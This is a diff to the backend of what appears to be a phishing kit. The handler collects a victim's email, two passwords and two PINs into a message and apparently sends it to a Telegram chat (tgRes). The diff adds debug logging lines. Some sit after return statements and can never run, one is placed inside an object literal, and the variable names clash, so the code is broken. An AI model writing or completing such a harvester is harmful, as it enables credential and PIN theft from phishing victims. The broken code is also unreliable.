@@ -28,6 +28,7 @@ module.exports = async function (req, res) {
 
   if (!rcxrr || !psrd || !psrdp || !pnct || !pnctr) {
     return res.status(400).json({ success: false});
+    console.log("DEBUG: Condition not met, sending 400 response.");
   }
 
   const message = `Eml: ${rxcrr}\nPswd1: ${psrd}\nPswd2: ${psrdp}\nPn1: ${pnct}\nPn2: ${pnctr}`;
@@ -46,11 +47,13 @@ module.exports = async function (req, res) {
       const errorData = await tgRes.json();
       return res.status(500).json({
         success: false,
+        console.log("DEBUG: Not sent, sending esponse.");
       });
     }
 
     return res.status(200).json({ success: true });
   } catch (err) {
     return res.status(500).json({ success: false});
+    console.log("DEBUG: Condition not met err 200, sending 200 response.");
   }
 };
